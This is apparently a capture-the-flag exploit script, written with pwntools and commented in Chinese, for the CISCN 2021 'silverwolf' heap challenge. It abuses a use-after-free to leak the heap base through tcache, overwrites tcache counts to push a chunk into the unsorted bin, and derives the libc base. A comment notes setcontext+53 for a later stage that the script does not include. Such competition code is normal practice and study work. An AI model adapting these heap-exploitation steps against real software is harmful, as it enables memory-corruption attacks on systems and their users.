from pwn import *

context(log_level="debug")

io = process("./silverwolf")
libc = ELF("./libc-2.27.so")


def gdb_debug():
    gdb.attach(
        io,
        gdbscript="""
    set debug-file-directory /data/project/ctf-repo/pwn/nssctf/CISCN_2021_初赛-silverwolf/.debug/
    nosharedlibrary
    sharedlibrary
    decompiler connect ida
    """,
    )


def allocate(idx: int, size: int):
    io.recvuntil(b"Your choice: ")
    io.sendline(b"1")
    io.recvuntil(b"Index: ")
    io.sendline(str(idx).encode())
    io.recvuntil(b"Size: ")
    io.sendline(str(size).encode())
    print(f"allocate {idx}：{hex(size)}")


def edit(idx: int, content: bytes):
    io.recvuntil(b"Your choice: ")
    io.sendline(b"2")
    io.recvuntil(b"Index: ")
    io.sendline(str(idx).encode())
    io.recvuntil(b"Content: ")
    io.sendline(content)
    print(f"edit {idx}：{content}")


def show(idx: int):
    io.recvuntil(b"Your choice: ")
    io.sendline(b"3")
    io.recvuntil(b"Index: ")
    io.sendline(str(idx).encode())
    print(f"show {idx}")


def delete(idx: int):
    io.recvuntil(b"Your choice: ")
    io.sendline(b"4")
    io.recvuntil(b"Index: ")
    io.sendline(str(idx).encode())
    print(f"delete {idx}")


"""
从 0x80 的 tcache 取出再放回去。拿到 tcache 的地址。
tcache 的头节点指向 tcache_entry 的一个地址。这样可以拿到 bin 基址
"""
allocate(0, 0x78)
delete(0)
show(0)
io.recvuntil("Content: ")
heap_base = u64(io.recv(6).ljust(8, b"\x00")) - 0x11b0
print("heap base address =", hex(heap_base))

edit(0, p64(heap_base + 0x10))
allocate(0, 0x78)
allocate(0, 0x78)
# 此时 heapVar 保存 tcache 地址

"""
修改 tcache->count 对应 0x250 位置为 7 填满
64 bits tcache_perthread_struct 的 chunk 是 0x250
填满后进 unsortded bin 拿 main_arena 指针
"""
edit(0, p64(0) * 4 + p64(0x0000000007000000))
delete(0)
show(0)

gdb_debug()
io.recvuntil("Content: ")
malloc_hook_addr = u64(io.recv(6).ljust(8, b"\x00")) - 96 - 0x10
print("main arena address =", hex(malloc_hook_addr))
libc_base_addr = malloc_hook_addr - libc.sym["__malloc_hook"]
# 拿到 libc 基址

print("libc base address =", hex(libc_base_addr))

edit(0, p64(0) * 5) # 修复 tcache

io.interactive()

"""
setcontext+53 是开始系统性从结构体里把寄存器弹出来的委托。
ucontext_t 结构体
"""
